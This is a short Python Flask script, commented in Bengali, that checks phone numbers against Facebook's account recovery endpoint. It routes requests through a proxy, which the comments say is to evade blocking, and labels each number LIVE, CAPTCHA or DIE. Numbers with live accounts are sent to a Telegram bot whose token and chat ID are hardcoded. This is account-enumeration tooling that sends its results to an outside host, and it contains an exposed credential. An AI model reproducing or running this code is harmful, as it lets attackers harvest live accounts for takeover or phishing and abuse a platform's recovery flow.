import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# --- আপনার দেওয়া টেলিগ্রাম তথ্য ---
BOT_TOKEN = "8464116667:AAFmzCKP1ym_faVvPAWoFY4n6avl0KzD22w"
CHAT_ID = "8049669100"

# আপনার ABC Proxy (User:Pass@IP:Port) এখানে বসান
# প্রক্সি না দিলে ফেসবুক আপনার সার্ভার আইপি ব্লক করে দিবে
ABC_PROXY = "your_user:your_pass@ip:port" 
proxies = {"http": f"http://{ABC_PROXY}", "https": f"http://{ABC_PROXY}"}

@app.route('/')
def home():
    # এটি templates ফোল্ডারের ভেতর index.html ফাইলটি লোড করবে
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check():
    phone = request.json.get('phone')
    url = "https://m.facebook.com/recover/initiate/"
    
    try:
        # ফেসবুকের রিকভারি পেজে রিকোয়েস্ট পাঠানো
        res = requests.post(url, data={'email': phone}, proxies=proxies, timeout=10)
        
        if "send_code" in res.text:
            # অ্যাকাউন্ট সচল থাকলে টেলিগ্রামে মেসেজ পাঠানো
            msg = f"🔔 FB LIVE ACCOUNT FOUND!\n\nNumber: {phone}\nStatus: OTP Sent ✅\nTool: Advance V6"
            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
            return jsonify({"status": "LIVE"})
        elif "captcha" in res.text:
            return jsonify({"status": "CAPTCHA"})
        else:
            return jsonify({"status": "DIE"})
    except Exception as e:
        return jsonify({"status": "ERROR", "msg": str(e)})

if __name__ == "__main__":
    app.run()